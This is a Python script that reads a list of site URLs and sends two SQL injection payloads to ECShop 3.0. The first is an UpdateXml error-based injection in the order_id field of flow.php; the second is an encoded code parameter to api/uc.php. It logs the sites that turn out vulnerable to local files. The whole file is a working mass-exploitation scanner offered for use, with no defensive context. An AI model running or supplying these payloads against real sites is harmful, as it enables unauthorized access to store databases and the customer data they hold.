import sys
import json
import requests
import warnings
from termcolor import cprint


urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'



for i in urls:
    url = i.rstrip("\n")
    #order_id注入
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/flow.php?step=repurchase"
    post_data = {
        "order_id": "1/**/Or/**/UpdateXml(1,ConCat(0x7e,(Md5(1234))),0)/**/Or/**/11#"
    }
    vulnurl = url + payload
    try:
        req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
            print("[+]存在ecshop3.0 flow.php 参数order_id注入漏洞...(高危)\tpayload: " + vulnurl + "\npost: " + json.dumps(post_data, indent=4), "red")
            with open('order_id注入.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在ecshop_flow_orderid_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
    #code SQL注入
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/api/uc.php?code=6116diQV4NziG3G8ttFnwTYmEp60E3K27Q0fDWaey%2bTuNLsGKdb1%2b6bPFT%2fIjJEMPlzS5Tm3InnRZKczTQBFXzXmDD5bs4Il5pbFswzA9SWE4gqcbuN8LgLJlTQqvVeSRUfFn4dhgto6yjPsJp7Za6GJEQ"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"updatexml" in req.text and r"XPATH" in req.text:
            print("[+]存在ecshop uc.php参数code SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('code SQL注入.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在ecshop_uc_code_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

